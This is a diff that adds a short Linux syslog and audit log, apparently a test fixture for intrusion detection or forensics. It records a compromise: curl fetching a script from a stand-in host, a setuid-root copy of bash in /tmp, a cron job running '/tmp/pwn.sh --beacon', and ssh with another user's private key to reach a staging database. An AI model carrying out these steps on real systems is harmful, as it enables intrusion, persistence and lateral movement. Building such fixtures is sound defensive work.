@@ -1,0 +1,9 @@
+Apr  1 08:55:00 edge systemd[1]: Started Daily apt download activities.
+Apr  1 08:58:03 edge cron[200]: (CRON) info (running with inotify support)
+Apr  1 09:00:09 edge kernel: audit: type=EXECVE msg=audit(1775034009.122:88): argc=3 a0="curl" a1="-fsSL" a2="https://example.test/r.sh"
+Apr  1 09:00:13 edge systemd[1]: tmp-pwn.scope: Succeeded.
+Apr  1 09:01:44 edge kernel: audit: type=PATH msg=audit(1775034104.331:91): item=0 name="/tmp/.bash" inode=803733 mode=0104755 ouid=0 ogid=0
+Apr  1 09:02:00 edge CRON[4200]: (user) CMD (/tmp/pwn.sh --beacon)
+Apr  1 09:02:00 edge CRON[4201]: (user) CMD (/tmp/pwn.sh --beacon)
+Apr  1 09:02:14 edge kernel: audit: type=EXECVE msg=audit(1775034134.781:94): argc=4 a0="ssh" a1="-i" a2="/home/alice/.ssh/id_rsa" a3="alice@db-staging"
+Apr  1 09:05:01 edge systemd[1]: Started Session 411 of user deploy.
